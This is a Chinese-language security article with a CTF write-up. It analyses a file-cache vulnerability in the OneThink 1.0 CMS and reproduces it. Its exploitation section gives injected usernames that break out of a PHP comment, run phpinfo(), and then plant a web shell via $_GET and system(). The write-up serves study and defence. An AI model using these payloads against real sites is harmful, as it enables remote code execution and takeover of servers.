# OneThink1.0文件缓存漏洞分析及题目复现

阅读量 **375385**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-07-24 14:00:14

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t01f7b0a0474fea7d20.jpg)

## 0x01 前言

![](https://www.yourhome.ren/usr/uploads/2018/07/1357181834.png)

最近的极客巅峰CTF中碰到了这个漏洞的实际利用:

![](https://www.yourhome.ren/usr/uploads/2018/07/1434781968.png)

一开始陷入了僵局，还以为是ueditor的文件上传，绕了半天，结果凉凉：

![](https://www.yourhome.ren/usr/uploads/2018/07/338590195.png)

首先访问题目页面，发现是一个OneThink1.0的CMS：

![](https://www.yourhome.ren/usr/uploads/2018/07/2385516381.png)

上网站扫描器进行目录扫描和源码泄露扫描，发现存在源码泄露的压缩包www.zip：

![](https://www.yourhome.ren/usr/uploads/2018/07/443359404.png)

## 0x02 分析

源码下载之后，拖入Seay源码审计工具中分析上述的缓存漏洞是否存在：  
首先查看源码中定义的缓存文件路径配置信息，在`ThinkPHP/ThinkPHP.php`中对`TEMP_PATH`定义为`Runtime/Temp`：

![](https://www.yourhome.ren/usr/uploads/2018/07/3214430039.png)

在`ThinkPHP/Conf/convenion.php`中同时定义了`DATA_CACHE_PATH`也为`Runtime/Temp`:

![](https://www.yourhome.ren/usr/uploads/2018/07/3304700748.png)

在`Think/Cache/Driver/File.class.php`中构造函数定义了File缓存类的`options['temp']`为`DATA_CACHE_PATH`，因此File缓存类的存放路径在`Runtime/Temp/`

![](https://www.yourhome.ren/usr/uploads/2018/07/2975671235.png)

在File缓存类中定义了设置缓存的set函数，在该函数中，一开始定义了`$filename`是`filename($name)`的返回结果，并且通过`file_put_contents`函数将缓存内容写入`$filename`路径的文件中，如下：

![](https://www.yourhome.ren/usr/uploads/2018/07/1922857766.png)

这个类中的`filename`函数定义如下：

![](https://www.yourhome.ren/usr/uploads/2018/07/2361764345.png)

其中的FIle类的`options['prefix']`为全局设置的空值’’：

![](https://www.yourhome.ren/usr/uploads/2018/07/820274777.png)

另外，由于`DATA_CACHE_SUBDIR`配置中设置为`false`，因此`filename`中会进入else分支，最后$file为`空+$name+.php`

![](https://www.yourhome.ren/usr/uploads/2018/07/1559828974.png)

其中`$name`是`onethink_+md5(md5($name参数))`  
所以`filename`函数最后返回内容是：

    
    
    Runtime/Temp/onethink_+md5(md5($name参数))
    

而set函数中调用时，传入的`$name`和`$value`参数也来自set函数被调用时的参数，而传入的`$value`经过serialize序列化函数进行处理后赋值`$data`，并最终作为写入内容  
另外注意到：在写入前`$data`做了字符拼接，并且前面的字符`<?phpn//`格外引人注目，这里要注意//注释符号，后面会解释这一点。

![](https://www.yourhome.ren/usr/uploads/2018/07/3276184706.png)

通过调用查询，在`ThinkPHP/Mode/Api/functions.php`中定义的缓存函数S中使用了File缓存类的set函数，其中`$name`和`$value`又是来自调用上层的传参`$name`和`$value`：

![](https://www.yourhome.ren/usr/uploads/2018/07/1660258235.png)

继续回溯查询S被调用的情况，在`Appalication/Common/Api/UserApi.class.php`中，发现`get_username`函数逻辑中调用了S函数，并且传参`"sys_active_user_list"`和`$list`。

![](https://www.yourhome.ren/usr/uploads/2018/07/2426413171.png)

    
    
    $list
    

的内容是通过从数据库查询uid返回的用户信息中，提取第二项拿到的，既

    
    
    nickname
    

![](https://www.yourhome.ren/usr/uploads/2018/07/1369648638.png)

所以此处调用S函数，会写入临时文件：

    
    
    onethink_md5(md5("sys_active_user_list"))
    

既内容为

    
    
    onethine_d403acece4ebce56a3a4237340fbbe70
    

内容是用户的nickname。

仍然继续回溯get_username()函数的调用情况，定位到`Application/Home/Model/MemberModel.class.php`模型文件中的autoLogin函数和login函数：

![](https://www.yourhome.ren/usr/uploads/2018/07/2143005009.png)

![](https://www.yourhome.ren/usr/uploads/2018/07/2621661973.png)

分析上面两个函数，login函数将传入的uid进行判断，如果是已注册的用户，则前面的判断分支全部跳过，直接调用了autoLogin函数，并且将数据库查询结果`find($uid)`的用户信息返回结果作为`$user`进行传参。  
在autoLogin函数中将`$user`中的`uid`一项继续传入上面介绍过的`get_username()`函数。

这样，这个逻辑的代码层面已经走过一遍了。在用户登录后的逻辑执行中，将用户的用户名作为缓存项写入了`Runtime/Temp`中的临时文件中，并且对用户名没有做任何的过滤和转义。如果缓存文件存在访问权限，可以导致代码执行以及GetShell。

## 0x03 利用

首先利用该漏洞尝试执行phpinfo。  
注册用户`%0aphpinfo();#`  
其中`%0a`是让用户名在缓存文件中以新的一行开始（前面分析代码时提到`$data`会和前面的`<?phpn//`拼接，这里是防止被`//`注释），而#注释符则让之后序列化产生的字符失效，防止影响函数执行。

![](https://www.yourhome.ren/usr/uploads/2018/07/202209697.png)

提交注册，通过Burpsuit进行拦截，这里将`%0a`进行url编码解码，成为换行符

![](https://www.yourhome.ren/usr/uploads/2018/07/2401884255.png)

![](https://www.yourhome.ren/usr/uploads/2018/07/3781957520.png)

将数据包放行后，用户注册成功，进入登录界面进行登录：

![](https://www.yourhome.ren/usr/uploads/2018/07/640679827.png)

同样进行抓包拦截，修改%0a后放行：

![](https://www.yourhome.ren/usr/uploads/2018/07/3275754354.png)

![](https://www.yourhome.ren/usr/uploads/2018/07/2429128349.png)

payload用户登录成功，接下来访问缓存页面  
发现成功执行phpinfo()！

![](https://www.yourhome.ren/usr/uploads/2018/07/1240943720.png)

在本地搭建同样环境后测试，发现缓存文件中内容如下：

![](https://www.yourhome.ren/usr/uploads/2018/07/615887971.png)

同样的方法向缓存文件中写入代码执行：

    
    
    %0a$a=$_GET[a];#
    %0asystem($a);#
    

![](https://www.yourhome.ren/usr/uploads/2018/07/3354756140.png)

![](https://www.yourhome.ren/usr/uploads/2018/07/834827636.png)

![](https://www.yourhome.ren/usr/uploads/2018/07/3671773060.png)

最后，感谢阅读(#^.^#)

审核人：yiwang 编辑：边边

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **yunsle** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/152584](/post/id/152584)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)
  * [文件缓存](/tag/文件缓存)
  * [OneThink1.0漏洞](/tag/OneThink1.0漏洞)

 **+1** __6赞

 __收藏

![](https://p3.ssl.qhimg.com/t018d078a0ca4861591.jpg) yunsle

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

